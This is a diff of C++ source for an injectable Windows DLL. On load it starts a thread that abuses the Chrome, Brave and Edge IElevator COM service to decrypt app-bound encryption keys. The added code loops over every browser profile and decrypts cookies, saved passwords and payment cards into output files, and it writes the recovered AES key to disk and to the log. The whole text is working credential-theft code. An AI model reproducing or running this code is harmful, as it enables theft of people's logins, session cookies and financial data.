@@ -1149,16 +1052,16 @@ DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
             FreeLibraryAndExitThread(hModule_dll_copy, 1);
         return 1;
     }
-    const std::vector<uint8_t> &encKey = *optEncKey;
+    const std::vector<uint8_t> &encKeyBlob = *optEncKey;
 
-    Logging::Log("[+] Encrypted key blob from Local State (" + std::to_string(encKey.size()) + " bytes).");
-    if (!encKey.empty())
+    Logging::Log("[+] Encrypted key blob from Local State (" + std::to_string(encKeyBlob.size()) + " bytes).");
+    if (!encKeyBlob.empty())
     {
-        auto previewLen = std::min<size_t>(16, encKey.size());
-        Logging::Log("[+] Encrypted key (preview): " + ChromeAppBound::BytesToHexString(encKey.data(), previewLen) + (encKey.size() > previewLen ? "..." : ""));
+        auto previewLen = std::min<size_t>(16, encKeyBlob.size());
+        Logging::Log("[+] Encrypted key (preview): " + ChromeAppBound::BytesToHexString(encKeyBlob.data(), previewLen) + (encKeyBlob.size() > previewLen ? "..." : ""));
     }
 
-    BSTR bstrEncKey = SysAllocStringByteLen(reinterpret_cast<const char *>(encKey.data()), (UINT)encKey.size());
+    BSTR bstrEncKey = SysAllocStringByteLen(reinterpret_cast<const char *>(encKeyBlob.data()), (UINT)encKeyBlob.size());
     if (!bstrEncKey)
     {
         Logging::Log("[-] SysAllocStringByteLen failed for encrypted key.");
@@ -1170,19 +1073,68 @@ DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
     { if (b) SysFreeString(b); };
     std::unique_ptr<OLECHAR[], decltype(bstrEncKeyFreer)> bstrEncKeyPtr(bstrEncKey, bstrEncKeyFreer);
 
-    if (browserType_worker == "edge") {
-        if (edgeElevator) { 
+    BSTR bstrPlainKey = nullptr;
+    DWORD lastComError = 0;
+    HRESULT hr_decrypt = E_FAIL;
+
+    Microsoft::WRL::ComPtr<IOriginalBaseElevator> chromeBraveElevator;
+    Microsoft::WRL::ComPtr<IEdgeElevatorFinal> edgeElevator;
+    std::ostringstream oss_hresult_hex;
+
+    if (browserType_worker == "edge")
+    {
+        HRESULT hr_create = CoCreateInstance(cfg.clsid, nullptr, CLSCTX_LOCAL_SERVER, cfg.iid, &edgeElevator);
+        if (SUCCEEDED(hr_create))
+        {
+            Logging::Log("[+] IElevator instance created for Edge.");
+            HRESULT hr_proxy = CoSetProxyBlanket(edgeElevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
+            oss_hresult_hex.str("");
+            oss_hresult_hex.clear();
+            oss_hresult_hex << "0x" << std::hex << hr_proxy;
+            if (FAILED(hr_proxy))
+            {
+                Logging::Log("[-] CoSetProxyBlanket failed for Edge: " + oss_hresult_hex.str());
+            }
+            else
+            {
+                Logging::Log("[+] Proxy blanket set for Edge.");
+            }
             hr_decrypt = edgeElevator->DecryptData(bstrEncKey, &bstrPlainKey, &lastComError);
-        } else { 
-            Logging::Log("[-] Edge elevator ComPtr is null before DecryptData call.");
-            hr_decrypt = E_POINTER; 
         }
-    } else {
-        if (chromeBraveElevator) { 
+        else
+        {
+            oss_hresult_hex.str("");
+            oss_hresult_hex.clear();
+            oss_hresult_hex << "0x" << std::hex << hr_create;
+            Logging::Log("[-] CoCreateInstance failed for Edge: " + oss_hresult_hex.str());
+        }
+    }
+    else
+    {
+        HRESULT hr_create = CoCreateInstance(cfg.clsid, nullptr, CLSCTX_LOCAL_SERVER, cfg.iid, &chromeBraveElevator);
+        if (SUCCEEDED(hr_create))
+        {
+            Logging::Log("[+] IElevator instance created for " + cfg.name + ".");
+            HRESULT hr_proxy = CoSetProxyBlanket(chromeBraveElevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
+            oss_hresult_hex.str("");
+            oss_hresult_hex.clear();
+            oss_hresult_hex << "0x" << std::hex << hr_proxy;
+            if (FAILED(hr_proxy))
+            {
+                Logging::Log("[-] CoSetProxyBlanket failed for " + cfg.name + ": " + oss_hresult_hex.str());
+            }
+            else
+            {
+                Logging::Log("[+] Proxy blanket set (PKT_PRIVACY, IMPERSONATE, DYNAMIC_CLOAKING) for " + cfg.name + ".");
+            }
             hr_decrypt = chromeBraveElevator->DecryptData(bstrEncKey, &bstrPlainKey, &lastComError);
-        } else { 
-            Logging::Log("[-] Chrome/Brave elevator ComPtr is null before DecryptData call.");
-            hr_decrypt = E_POINTER; 
+        }
+        else
+        {
+            oss_hresult_hex.str("");
+            oss_hresult_hex.clear();
+            oss_hresult_hex << "0x" << std::hex << hr_create;
+            Logging::Log("[-] CoCreateInstance failed for " + cfg.name + ": " + oss_hresult_hex.str());
         }
     }
 
@@ -1199,12 +1151,6 @@ DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
         else
             err_decrypt << ". Decrypted BSTR is null.";
         Logging::Log(err_decrypt.str());
-        if (lastComError == ERROR_INVALID_DATA)
-            Logging::Log("    COM LastError: invalid data.");
-        else if (lastComError == ERROR_DECRYPTION_FAILED || lastComError == static_cast<DWORD>(0x8007065B))
-        {
-            Logging::Log("    COM LastError: decryption failed within COM server.");
-        }
         if (hModule_dll_copy)
             FreeLibraryAndExitThread(hModule_dll_copy, 1);
         return 1;
@@ -1218,23 +1164,120 @@ DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
     ChromeAppBound::SaveKeyToFile(hexKey);
     Logging::Log("[+] Decrypted AES Key (hex): " + hexKey);
 
-    ChromeAppBound::DecryptCookies(aesKey, cfg);
-    ChromeAppBound::DecryptPasswords(aesKey, cfg);
-    ChromeAppBound::DecryptPaymentMethods(aesKey, cfg);
+    fs::path userDataRoot;
+    try
+    {
+        userDataRoot = ChromeAppBound::GetLocalAppDataPath() / cfg.userDataRootSubPath;
+    }
+    catch (const std::runtime_error &e)
+    {
+        Logging::Log("[-] Failed to get User Data Root path: " + std::string(e.what()));
+        if (hModule_dll_copy)
+            FreeLibraryAndExitThread(hModule_dll_copy, 1);
+        return 1;
+    }
+
+    std::vector<fs::path> profilePaths;
+    try
+    {
+        if (fs::exists(userDataRoot / "Default") && fs::is_directory(userDataRoot / "Default"))
+        {
+            profilePaths.push_back(userDataRoot / "Default");
+            Logging::Log("[*] Found profile: Default");
+        }
+        for (const auto &entry : fs::directory_iterator(userDataRoot))
+        {
+            if (entry.is_directory())
+            {
+                std::string dirName = entry.path().filename().string();
+                if (dirName.rfind("Profile ", 0) == 0)
+                {
+                    profilePaths.push_back(entry.path());
+                    Logging::Log("[*] Found profile: " + dirName);
+                }
+            }
+        }
+    }
+    catch (const fs::filesystem_error &e)
+    {
+        Logging::Log("[-] Filesystem error enumerating profiles in " + userDataRoot.u8string() + ": " + e.what());
+    }
+
+    if (profilePaths.empty())
+    {
+        bool dbs_in_root = false;
+        try
+        {
+            dbs_in_root = fs::exists(userDataRoot / cfg.cookieDbRelativePath) ||
+                          fs::exists(userDataRoot / cfg.loginDataDbRelativePath) ||
+                          fs::exists(userDataRoot / cfg.webDataDbRelativePath);
+        }
+        catch (const fs::filesystem_error &e_check)
+        {
+            Logging::Log("[-] Filesystem error checking for DBs in UserDataRoot " + userDataRoot.u8string() + ": " + e_check.what());
+        }
+
+        if (dbs_in_root)
+        {
+            Logging::Log("[!] No standard profiles found, but DBs might be in UserDataRoot. Treating UserDataRoot as 'Default' profile.");
+            profilePaths.push_back(userDataRoot);
+        }
+        else
+        {
+            Logging::Log("[-] No profile directories (Default or Profile *) found with recognizable DB structure in " + userDataRoot.u8string() + ". Cannot extract data.");
+        }
+    }
+
+    for (const auto &profilePath : profilePaths)
+    {
+        std::string currentProfileName = profilePath.filename().string();
+        if (profilePath == userDataRoot && currentProfileName != "Default" && currentProfileName.rfind("Profile ", 0) != 0)
+        {
+            currentProfileName = "Default_or_Root";
+        }
+
+        Logging::Log("[*] Processing profile: " + currentProfileName + " at path: " + profilePath.u8string());
+
+        fs::path cookieDbFullPath = profilePath / cfg.cookieDbRelativePath;
+        fs::path loginDbFullPath = profilePath / cfg.loginDataDbRelativePath;
+        fs::path webDbFullPath = profilePath / cfg.webDataDbRelativePath;
+
+        fs::path cookiesOutputFile = ChromeAppBound::GetOutputFilePath(finalOutputPath, cfg.name, currentProfileName, "cookies");
+        fs::path passwordsOutputFile = ChromeAppBound::GetOutputFilePath(finalOutputPath, cfg.name, currentProfileName, "passwords");
+        fs::path paymentsOutputFile = ChromeAppBound::GetOutputFilePath(finalOutputPath, cfg.name, currentProfileName, "payments");
+
+        if (fs::exists(cookieDbFullPath))
+        {
+            ChromeAppBound::DecryptCookies(aesKey, cookieDbFullPath, cookiesOutputFile);
+        }
+        else
+        {
+            Logging::Log("[-] Cookies DB not found for profile '" + currentProfileName + "' at: " + cookieDbFullPath.u8string());
+        }
+        if (fs::exists(loginDbFullPath))
+        {
+            ChromeAppBound::DecryptPasswords(aesKey, loginDbFullPath, passwordsOutputFile);
+        }
+        else
+        {
+            Logging::Log("[-] Login Data DB not found for profile '" + currentProfileName + "' at: " + loginDbFullPath.u8string());
+        }
+        if (fs::exists(webDbFullPath))
+        {
+            ChromeAppBound::DecryptPaymentMethods(aesKey, webDbFullPath, paymentsOutputFile);
+        }
+        else
+        {
+            Logging::Log("[-] Web Data DB not found for profile '" + currentProfileName + "' at: " + webDbFullPath.u8string());
+        }
+    }
 
     Logging::Log("[*] Chrome data decryption process finished for " + cfg.name + ".");
 
     HANDLE hEvent = OpenEventW(EVENT_MODIFY_STATE, FALSE, COMPLETION_EVENT_NAME_DLL);
     if (hEvent != NULL)
     {
-        if (SetEvent(hEvent))
-        {
-            // Logging::Log("[+] Signaled completion event (" + ChromeAppBound::WCharArrToString(COMPLETION_EVENT_NAME_DLL) + ").");
-        }
-        else
-        {
-            Logging::Log("[-] Failed to set completion event. Error: " + std::to_string(GetLastError()));
-        }
+        SetEvent(hEvent);
         CloseHandle(hEvent);
     }
     else
@@ -1255,7 +1298,6 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
     if (reason == DLL_PROCESS_ATTACH)
     {
         DisableThreadLibraryCalls(hModule);
-
         ThreadParams *params = new (std::nothrow) ThreadParams();
         if (!params)
         {
@@ -1265,7 +1307,6 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
         params->hModule_dll = hModule;
 
         HANDLE hThread = CreateThread(NULL, 0, DecryptionThreadWorker, params, 0, NULL);
-
         if (hThread == NULL)
         {
             OutputDebugStringA(("chrome_decrypt: DllMain: Failed to create worker thread. Error: " + std::to_string(GetLastError()) + "\n").c_str());
